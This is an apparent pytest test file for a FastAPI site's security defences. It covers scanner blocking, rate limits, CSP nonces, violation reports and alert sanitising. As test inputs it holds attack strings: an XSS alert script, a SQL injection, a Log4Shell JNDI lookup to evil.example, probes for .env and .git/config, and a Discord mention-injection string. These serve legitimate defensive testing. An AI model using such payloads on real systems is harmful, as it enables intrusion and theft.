from __future__ import annotations

import base64
import hashlib
import json
import re

import importlib

import itsdangerous
import pytest
from fastapi.testclient import TestClient

import config_app


ADMIN_ID = "42"


@pytest.fixture(autouse=True)
def _current_app_module():
    """Other tests re-import config_app; always drive the current module."""

    global config_app
    config_app = importlib.import_module("config_app")
    yield


def _session_cookie(data: dict) -> str:
    signer = itsdangerous.TimestampSigner(str(config_app.SESSION_SECRET))
    return signer.sign(base64.b64encode(json.dumps(data).encode("utf-8"))).decode("utf-8")


def _client(user_id: str | None = None) -> TestClient:
    client = TestClient(config_app.app, base_url="https://testserver")
    if user_id:
        cookie = _session_cookie({"user": {"id": user_id, "username": f"user{user_id}", "global_name": "Ada"}})
        client.cookies.set(config_app.SESSION_COOKIE_NAME, cookie)
    return client


@pytest.fixture
def presence(monkeypatch):
    """Empty presence store that never writes to the repository's dossiers."""

    monkeypatch.setattr(config_app, "_persist_admin_presence", lambda _entries: None)
    monkeypatch.setattr(config_app, "_persist_activity_log", lambda _entries: None)
    monkeypatch.setattr(config_app, "_user_is_portal_admin", lambda candidate: str(candidate) == ADMIN_ID)
    with config_app._ADMIN_PRESENCE_LOCK:
        config_app._ADMIN_PRESENCE.clear()
        config_app._ADMIN_PRESENCE_LOADED = True
    with config_app._ACTIVITY_LOG_LOCK:
        config_app._ACTIVITY_LOGS.clear()
        config_app._ACTIVITY_LOG_LOADED = True
    yield
    with config_app._ADMIN_PRESENCE_LOCK:
        config_app._ADMIN_PRESENCE.clear()


# ------------------------------------------------------------------- shield


def test_scanner_is_blocked_and_reported_to_directors(presence):
    client = _client()
    assert client.get("/.env").status_code == 404
    assert client.get("/wp-login.php").status_code == 404
    assert client.get("/.git/config").status_code == 403
    blocked = client.get("/", headers={"accept": "text/html"})
    assert blocked.status_code == 403
    assert "temporarily blocked" in blocked.text

    feed = config_app._activity_snapshot()
    assert feed[0]["type"] == "security-alert"
    assert "Auto-blocked testclient" in feed[0]["user"]
    assert config_app.SECURITY_SHIELD.active_blocks()[0]["ip"] == "testclient"


def test_health_check_is_never_limited(presence):
    client = _client()
    for _ in range(3):
        client.get("/.env")
    assert client.get("/health").status_code == 200


def test_signed_in_admins_get_more_room_but_are_not_exempt(presence):
    client = _client(ADMIN_ID)
    # Five times an anonymous client's allowance, counted against the account.
    for _ in range(14):
        assert client.get("/.env").status_code == 404
    assert client.get("/me").status_code == 200
    assert client.get("/.env").status_code == 403
    blocked = client.get("/me", headers={"accept": "text/html"})
    assert blocked.status_code == 403
    assert "ask a director to lift the block" in blocked.text
    assert config_app.SECURITY_SHIELD.active_blocks()[0]["ip"] == f"admin:{ADMIN_ID}"
    assert f"Auto-blocked admin account {ADMIN_ID}" in config_app._activity_snapshot()[0]["user"]
    # Anonymous visitors on the same network are not caught by the account's block.
    assert _client().get("/health").status_code == 200
    assert _client().get("/me").status_code == 200


def test_admin_identity_comes_from_session_token_or_basic_auth(monkeypatch, presence):
    monkeypatch.setattr(config_app, "_session_user_is_admin", lambda _request: True)
    token = _client(ADMIN_ID).get("/api/auth/token").json()["token"]

    def scope(headers=(), query=b""):
        return {"type": "http", "headers": list(headers), "query_string": query, "path": "/"}

    identify = config_app._shield_admin_identity
    assert identify(scope([(b"authorization", f"Bearer {token}".encode())])) == ADMIN_ID
    assert identify(scope(query=f"token={token}".encode())) == ADMIN_ID
    assert identify(scope([(b"authorization", b"Bearer forged")])) is None
    assert identify(scope()) is None

    monkeypatch.setattr(config_app, "ADMIN_USER", "ops")
    monkeypatch.setattr(config_app, "ADMIN_PASS", "s3cret")
    good = base64.b64encode(b"ops:s3cret").decode()
    bad = base64.b64encode(b"ops:wrong").decode()
    assert identify(scope([(b"authorization", f"Basic {good}".encode())])) == "basic-auth"
    assert identify(scope([(b"authorization", f"Basic {bad}".encode())])) is None


def test_injection_in_the_url_is_refused_and_blocked(presence):
    client = _client()
    assert client.get("/archive?q=%3Cscript%3Ealert(1)%3C/script%3E").status_code == 404
    assert client.get("/about?id=1%27%20OR%20%271%27=%271").status_code == 404
    assert client.get("/about?x=${jndi:ldap://evil.example/a}").status_code == 403
    assert "injection payloads" in config_app._activity_snapshot()[0]["user"]


def test_security_headers_include_hsts():
    response = _client().get("/health")
    assert response.headers["strict-transport-security"] == "max-age=31536000"
    assert response.headers["cross-origin-opener-policy"] == "same-origin"


# ------------------------------------------------------- script injection


_INLINE_SCRIPT = re.compile(r"<script(?![^>]*\bsrc=)[^>]*>", re.IGNORECASE)


def _policy_nonce(response) -> str:
    policy = response.headers["content-security-policy"]
    script_src = next(part for part in policy.split(";") if part.strip().startswith("script-src "))
    assert "'unsafe-inline'" not in script_src
    assert "script-src-attr 'none'" in policy
    assert "object-src 'none'" in policy
    return re.search(r"'nonce-([^']+)'", script_src).group(1)


@pytest.mark.parametrize("path", ["/", "/about", "/features", "/wasp", "/zeta"])
def test_pages_only_run_inline_scripts_carrying_the_response_nonce(path):
    client = _client()
    first = client.get(path)
    second = client.get(path)
    assert first.status_code == 200
    nonce = _policy_nonce(first)
    assert nonce != _policy_nonce(second)
    scripts = _INLINE_SCRIPT.findall(first.text)
    assert scripts
    assert all(f'nonce="{nonce}"' in tag for tag in scripts), scripts


def test_every_inline_script_in_the_templates_carries_the_nonce():
    from pathlib import Path

    missing = []
    for template in sorted(Path("templates").glob("*.html")):
        for tag in _INLINE_SCRIPT.findall(template.read_text()):
            if 'nonce="{{ csp_nonce() }}"' not in tag:
                missing.append(f"{template.name}: {tag}")
    assert missing == []


def test_maintenance_page_script_carries_the_nonce():
    import contextvars

    def render():
        nonce = config_app.security_shield.new_csp_nonce()
        return nonce, config_app._build_maintenance_response({}).body.decode()

    nonce, body = contextvars.copy_context().run(render)
    scripts = _INLINE_SCRIPT.findall(body)
    assert scripts and all(f'nonce="{nonce}"' in tag for tag in scripts)


def test_csp_violation_reports_land_in_the_incident_list(presence):
    client = _client()
    report = {
        "csp-report": {
            "document-uri": "https://testserver/archive?token=secret-token",
            "violated-directive": "script-src-elem",
            "effective-directive": "script-src-elem",
            "blocked-uri": "inline",
            "script-sample": "alert(document.cookie)",
        }
    }
    headers = {"content-type": "application/csp-report"}
    assert client.post("/csp-report", content=json.dumps(report), headers=headers).status_code == 204
    event = config_app.SECURITY_SHIELD.recent_events()[0]
    assert event["kind"] == "csp"
    assert "an inline script on https://testserver/archive" in event["summary"]
    assert "alert(document.cookie)" in event["summary"]
    assert "secret-token" not in event["summary"]
    # The same violation again is not logged twice.
    client.post("/csp-report", content=json.dumps(report), headers=headers)
    assert [e["kind"] for e in config_app.SECURITY_SHIELD.recent_events()].count("csp") == 1

    reporting_api = [
        {
            "type": "csp-violation",
            "body": {
                "documentURL": "https://testserver/about",
                "effectiveDirective": "script-src-elem",
                "blockedURL": "https://evil.example/x.js?c=1",
            },
        }
    ]
    assert client.post("/csp-report", content=json.dumps(reporting_api)).status_code == 204
    assert "https://evil.example/x.js on https://testserver/about" in config_app.SECURITY_SHIELD.recent_events()[0]["summary"]
    # Blocked fonts and stylesheets are not attacks and stay out of the list.
    style = {"csp-report": {"document-uri": "https://testserver/", "effective-directive": "style-src-elem",
                            "blocked-uri": "https://fonts.googleapis.com/css2"}}
    client.post("/csp-report", content=json.dumps(style), headers=headers)
    assert "fonts.googleapis.com" not in config_app.SECURITY_SHIELD.recent_events()[0]["summary"]
    assert client.post("/csp-report", content=b"x" * 20_000).status_code == 413
    assert client.post("/csp-report", content=b"not json").status_code == 400


def test_uploaded_media_is_never_served_as_a_page_or_script():
    assert config_app._served_image_type("image/png") == "image/png"
    assert config_app._served_image_type("IMAGE/WEBP; charset=x") == "image/webp"
    for content_type in ("text/html", "application/javascript", "", None):
        assert config_app._served_image_type(content_type) == "application/octet-stream"


def test_director_can_block_and_unblock_from_security_overview(monkeypatch, presence):
    monkeypatch.setattr(config_app, "save_json", lambda *_args, **_kwargs: None)

    async def fake_director(_request):
        return {"id": config_app.OWNER_USER_ID, "username": "Director"}, None

    monkeypatch.setattr(config_app, "_require_director", fake_director)
    client = _client()

    response = client.post(
        "/director/security/block",
        data={"ip": "198.51.100.23", "duration": "3600", "reason": "Credential stuffing"},
        follow_redirects=False,
    )
    assert response.status_code == 303
    page = client.get("/director/security-overview")
    assert "Automated Defences" in page.text
    assert "198.51.100.23" in page.text
    assert "Credential stuffing" in page.text
    assert "Blocked 198.51.100.23 for 1 hour." in page.text

    response = client.post("/director/security/unblock", data={"ip": "198.51.100.23"}, follow_redirects=False)
    assert response.status_code == 303
    assert config_app.SECURITY_SHIELD.active_blocks() == []

    client.post("/director/security/block", data={"ip": "10.0.0.4"}, follow_redirects=False)
    assert "cannot be blocked" in client.get("/director/security-overview").text


def test_director_can_switch_under_attack_mode(monkeypatch, presence):
    monkeypatch.setattr(config_app, "save_json", lambda *_args, **_kwargs: None)

    async def fake_director(_request):
        return {"id": config_app.OWNER_USER_ID, "username": "Director"}, None

    monkeypatch.setattr(config_app, "_require_director", fake_director)
    client = _client()
    response = client.post("/director/security/under-attack", data={"mode": "on", "duration": "1800"})
    assert response.status_code == 200
    assert "Under-attack mode is on for 30 minutes." in response.text
    assert "Switch off under-attack mode" in response.text
    assert config_app.SECURITY_SHIELD.under_attack()

    page = client.post("/director/security/under-attack", data={"mode": "off"}).text
    assert "Under-attack mode is off" in page
    assert not config_app.SECURITY_SHIELD.under_attack()

    client.post("/director/security/block", data={"ip": "203.0.113.0/24", "duration": "3600"})
    assert "network 203.0.113.0/24" in client.get("/director/security-overview").text


def test_block_routes_require_the_director(presence):
    response = _client(ADMIN_ID).post("/director/security/block", data={"ip": "198.51.100.23"})
    assert response.status_code == 403
    assert config_app.SECURITY_SHIELD.active_blocks() == []


def test_removed_admin_token_stops_working(monkeypatch, presence):
    monkeypatch.setattr(config_app, "_session_user_is_admin", lambda _request: True)
    client = _client(ADMIN_ID)
    token = client.get("/api/auth/token").json()["token"]
    headers = {"Authorization": f"Bearer {token}"}
    beat = {"id": ADMIN_ID}
    assert client.post("/api/admin/heartbeat", json=beat, headers=headers).status_code == 200

    monkeypatch.setattr(config_app, "_user_is_portal_admin", lambda _candidate: False)
    assert client.post("/api/admin/heartbeat", json=beat, headers=headers).status_code == 403
    assert client.get("/api/moderation/actions", headers=headers).status_code == 403


def test_alice_site_wide_budget_raises_an_alert(monkeypatch, presence):
    monkeypatch.setattr(config_app.llm_client, "run_assistant", lambda message: f"echo: {message}")
    monkeypatch.setattr(
        config_app, "_ALICE_DAILY_SITE_WIDE", config_app._SlidingWindowRateLimiter(limit=1, window_seconds=86400)
    )
    monkeypatch.setattr(config_app, "_ALICE_BUDGET_ALERTED_AT", None)
    client = _client("777")
    assert client.post("/api/alice/command", json={"message": "status"}).json() == {"reply": "echo: status"}
    response = client.post("/api/alice/command", json={"message": "status"})
    assert response.status_code == 429
    assert config_app.SECURITY_SHIELD.recent_events()[0]["kind"] == "llm-budget"


# ----------------------------------------------------------------- presence


def test_admin_is_online_from_any_page(presence):
    assert _client().get("/api/admins/presence").json() == []

    _client(ADMIN_ID).get("/me")

    rows = _client().get("/api/admins/presence").json()
    assert rows == [{"id": ADMIN_ID, "status": "Online", "lastActive": "Recently"}]
    assert [entry["type"] for entry in config_app._activity_snapshot()] == ["online"]


def test_regular_members_are_not_tracked(presence):
    _client("777").get("/me")
    assert _client().get("/api/admins/presence").json() == []


def test_presence_ping(presence):
    assert _client(ADMIN_ID).post("/api/presence/ping").status_code == 204
    assert _client("777").post("/api/presence/ping").status_code == 403
    assert _client().post("/api/presence/ping").status_code == 403
    assert _client().get("/api/admins/presence").json()[0]["status"] == "Online"


def test_public_presence_hides_details_and_former_admins(presence):
    config_app._record_admin_heartbeat(ADMIN_ID, name="Ada", role="Director", clearance="Omega-9", ip="203.0.113.8")
    config_app._record_admin_heartbeat("99", name="Former", ip="203.0.113.9")
    rows = _client().get("/api/admins/presence").json()
    assert rows == [{"id": ADMIN_ID, "status": "Online", "lastActive": "Recently"}]


def _contact_page_fakes(monkeypatch):
    owner_settings, _etag = config_app.load_owner_settings()
    owner_settings = owner_settings.copy()
    owner_settings.managers = [ADMIN_ID]
    monkeypatch.setattr(config_app, "load_owner_settings", lambda *a, **k: (owner_settings, "etag"))
    monkeypatch.setattr(config_app, "load_admin_bios", lambda: {})

    async def roster(*_args, **_kwargs):
        return [
            {
                "id": ADMIN_ID,
                "name": "Ada",
                "username": "ada",
                "role": "System Overseer",
                "avatar": None,
                "initials": "A",
                "bio": "",
                "profile_url": "https://discord.com/users/42",
                "can_edit": False,
                "has_bio": False,
                "clearance": "Omega-9",
            }
        ]

    monkeypatch.setattr(config_app, "_build_admin_roster_entries", roster)


def test_contact_page_shows_online_admin_to_guests(monkeypatch, presence):
    _contact_page_fakes(monkeypatch)
    page = _client().get("/admin-team")
    assert page.status_code == 200
    assert ">Offline</span>" in page.text
    assert "admin_presence.js" not in page.text

    config_app._record_admin_heartbeat(ADMIN_ID, name="Ada", ip="203.0.113.8")
    page = _client().get("/admin-team")
    assert 'badge js-admin-status badge--online" data-admin-id="42">Online</span>' in page.text


def test_admin_pages_carry_the_presence_keepalive(monkeypatch, presence):
    _contact_page_fakes(monkeypatch)
    page = _client(ADMIN_ID).get("/admin-team")
    assert page.status_code == 200
    assert "/static/js/admin_presence.js" in page.text


# ---------------------------------------------------------------- passwords


def test_operator_passwords_use_bcrypt_and_upgrade_legacy_hashes(monkeypatch):
    import operator_login

    monkeypatch.setattr(operator_login, "_save", lambda: None)
    monkeypatch.setattr(operator_login, "_operators", {})

    operator_login.set_password(1, "correct horse battery staple")
    stored = operator_login.get_or_create_operator(1).password_hash
    assert stored.startswith("bcrypt-sha256$")
    assert operator_login.verify_password(1, "correct horse battery staple") == (True, False)
    assert operator_login.verify_password(1, "wrong") == (False, False)

    legacy = operator_login.get_or_create_operator(2)
    legacy.password_hash = hashlib.sha256(b"old-password").hexdigest()
    assert operator_login.verify_password(2, "old-password") == (True, False)
    assert legacy.password_hash.startswith("bcrypt-sha256$")
    assert operator_login.verify_password(2, "old-password") == (True, False)


def test_discord_alert_cannot_be_used_to_ping_or_link(monkeypatch):
    import asyncio
    import functools

    import httpx

    sent: list[dict] = []

    def handler(request: httpx.Request) -> httpx.Response:
        sent.append(json.loads(request.content))
        return httpx.Response(204)

    monkeypatch.setattr(config_app, "_SECURITY_ALERT_WEBHOOK_URL", "https://discord.test/api/webhooks/1/x")
    monkeypatch.setattr(config_app, "_SECURITY_ALERT_MENTION", "<@&555>")
    monkeypatch.setattr(
        config_app.httpx, "AsyncClient", functools.partial(httpx.AsyncClient, transport=httpx.MockTransport(handler))
    )
    event = {
        "summary": "Auto-blocked 203.0.113.5: probing (last: /<@&999>/`[x](https://evil.example)`)",
        "severity": "critical",
    }
    asyncio.run(config_app._send_security_alert(event))

    payload = sent[0]
    assert payload["allowed_mentions"] == {"parse": [], "roles": ["555"], "users": []}
    assert payload["content"].startswith("<@&555> ")
    # The attacker's text sits inside one code span with its backticks neutralised.
    assert payload["content"].count("`") == 2
